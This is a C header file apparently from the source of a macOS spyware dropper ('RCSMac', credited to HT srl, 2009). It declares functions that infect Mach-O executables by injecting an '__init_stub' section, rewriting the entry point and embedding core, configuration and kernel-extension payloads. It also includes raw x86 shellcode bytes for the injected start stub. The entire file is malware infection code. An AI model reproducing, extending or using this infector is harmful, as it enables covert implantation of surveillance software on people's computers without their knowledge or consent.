/*
 * RCSMac Dropper
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 20/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009 
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#ifdef WIN32
#pragma once
#include <Windows.h>
#endif

#include "RCSMacInfectorUtil.h"

#define INJECTED_SECTION_NAME "__init_stub"
#define INJECTED_SEGMENT_NAME "__PAGEZERO"

#define PAGE_ALIGNMENT  0x1000
#define MH_EXECUTE      0x2

#ifdef WIN32
typedef unsigned long vm_offset_t;
typedef unsigned long vm_size_t;
typedef int cpu_type_t;
#endif

typedef int cpu_subtype_t;
typedef int kern_return_t;
typedef int vm_prot_t;
typedef int mach0_vm_prot_t;
typedef int kern_return_t;

int numberOfResources;

//
// Type of strings
//
#define STRING_SYMBOL 0x0001
#define STRING_DATA   0x0002

#define CPU_TYPE_X86  0x7

#define SWAP_LONG(a) ( ((a) << 24) | \
                        (((a) << 8) & 0x00ff0000) | \
                        (((a) >> 8) & 0x0000ff00) | \
                        ((unsigned long)(a) >> 24) )

typedef int cpu_type_t;

unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
                           "\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
                           "\x4d\x08\x89\x4c\x24\x04\x83\xc3\x01"
                           "\xc1\xe3\x02\x01\xcb\x89\x5c\x24\x08"
                           "\x8b\x03\x83\xc3\x04\x85\xc0\x75\xf7"
                           "\x89\x5c\x24\x0c\xe8";

char *coreFileName;
char *confFileName;
char *kextFileName;
char *installPath;
char *inputFileName;
char *outputFileName;

int gCoreFileSize;
int gConfFileSize;
int gKextFileSize;

int gFileType; // 0 = SingleArch, 1 = FAT, 2 = FAT (swap)
int gNumStrings;
struct fatHeader gFatHeader;

typedef struct _infectionHeader
{
  int numberOfResources;
  int numberOfStrings;
  int dropperSize;
  unsigned long originalEP;
} infectionHeader;

typedef struct _strings
{
  char value[8];
  int type;
} stringTable;

typedef struct _resource
{
  unsigned int type;
  char name[32];
  char path[32];
  unsigned int size;
} resourceHeader;

unsigned int
getBinaryEP (void *machoBase);

int
setBinaryEP (void *machoBase, unsigned int anEntryPoint);

int infectSingleArch (char *inputFilePointer,
                      char *outputFilePointer,
                      int offsetToArch,
                      int inputFileSize,
                      int outputFileSize);

int
infectBinary (int aBinaryType,
              int fileSize,
              char *inputFilePointer,
              char *outputFilePointer,
              int outputFileSize,
              unsigned int *segmentVMAddr);

int
getBinaryFormat (char *aFilePointer);

#ifdef WIN32
void
usage (TCHAR *aBinaryName);
#else
void
usage (char *aBinaryName);
#endif

int
parseArguments (int argc, char **argv);
